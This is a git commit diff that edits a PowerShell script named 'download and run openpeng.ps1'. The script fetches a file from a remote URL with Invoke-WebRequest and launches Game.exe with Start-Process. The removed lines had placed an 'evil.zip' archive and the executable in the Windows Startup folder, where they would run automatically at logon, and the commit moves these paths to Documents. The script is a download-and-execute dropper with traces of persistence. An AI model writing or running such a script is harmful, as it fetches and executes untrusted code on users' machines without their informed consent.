8e3b888e92cda80fc6f03a7565d66df6763714f9
knoxoxen <149332086+knoxoxen@users.noreply.github.com>
2024-09-30 08:17:15 -0700

    Update download and run openpeng.ps1

--- download and run openpeng.ps1
+++ download and run openpeng.ps1
@@ -9,10 +9,10 @@ Invoke-WebRequest -Uri $url -OutFile $destination
 
 
 #Extract the ZIP file:
-#$zipPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.zip"
-#$extractPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+#$zipPath = "$env:USERPROFILE\Documents\Game.zip"
+#$extractPath = "$env:USERPROFILE\Documents\GameUnzipped"
 #Expand-Archive -Path $zipPath -DestinationPath $extractPath -F
 
 #Run the EXE file:
-$exePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Game.exe"
+$exePath = "$env:USERPROFILE\Documents\Game.exe"
 Start-Process -FilePath $exePath
